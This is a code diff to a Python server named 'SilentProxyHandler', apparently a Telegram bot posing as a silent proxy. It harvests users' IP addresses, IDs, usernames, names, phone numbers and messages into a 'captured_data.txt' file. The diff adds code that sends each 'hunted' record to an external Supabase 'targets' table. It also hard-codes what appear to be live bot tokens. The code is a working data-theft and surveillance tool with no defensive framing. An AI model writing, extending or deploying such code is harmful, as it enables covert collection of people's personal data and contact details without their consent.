@@ -2,6 +2,12 @@ from http.server import HTTPServer, BaseHTTPRequestHandler
 import json
 import os
 import requests
+from supabase import create_client, Client
+
+
+SUPABASE_URL = os.environ.get("SUPABASE_URL", "YOUR_SUPABASE_URL")
+SUPABASE_KEY = os.environ.get("SUPABASE_KEY", "YOUR_SUPABASE_KEY")
+supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY) if SUPABASE_URL != "YOUR_SUPABASE_URL" else None
 
 tokens = [
     "8827076146:AAGG1sCoE9ZZ_gH-zJT02tnVawtQeCTVnpE",
@@ -67,20 +73,29 @@ class SilentProxyHandler(BaseHTTPRequestHandler):
                 send_stealth_contact_request(chat_id)
 
             catch_report = {
-                "Client_IP": client_ip,
-                "User_ID": user.get('id'),
-                "Username": user.get('username'),
-                "First_Name": user.get('first_name'),
-                "Phone_Number": contact.get('phone_number'), 
-                "Input_Text": text,
-                "Raw_Payload": data
+                "client_ip": client_ip,
+                "user_id": str(user.get('id')),
+                "username": user.get('username'),
+                "first_name": user.get('first_name'),
+                "phone_number": contact.get('phone_number'), 
+                "input_text": text,
+                "raw_payload": data
             }
 
-            print("\n[+] --- hunted ---")
+            print("\n[+] --- hunted & logged to memory ---")
             print(json.dumps(catch_report, indent=4, ensure_ascii=False))
 
+            
             with open("captured_data.txt", "a", encoding="utf-8") as f:
                 f.write(json.dumps(catch_report, ensure_ascii=False) + "\n" + "="*50 + "\n")
+
+            
+            if supabase:
+                try:
+                    supabase.table("targets").insert(catch_report).execute()
+                    print("[+] Data successfully pushed to Supabase database!")
+                except Exception as db_err:
+                    print("[-] Supabase push error:", db_err)
 
         except Exception as e:
             print("[-] error:", e)
@@ -90,11 +105,10 @@ class SilentProxyHandler(BaseHTTPRequestHandler):
         self.wfile.write(b'OK')
 
 def run(server_class=HTTPServer, handler_class=SilentProxyHandler):
-   
     port = int(os.environ.get("PORT", 10000))
     server_address = ('', port)
     httpd = server_class(server_address, handler_class)
-    print(f"colonel went form here {port}... (Advanced MitM & Telemetry Collector Active)")
+    print(f"colonel went form here {port}... (Advanced MitM & Supabase Telemetry Active)")
     httpd.serve_forever()
 
 if __name__ == '__main__':
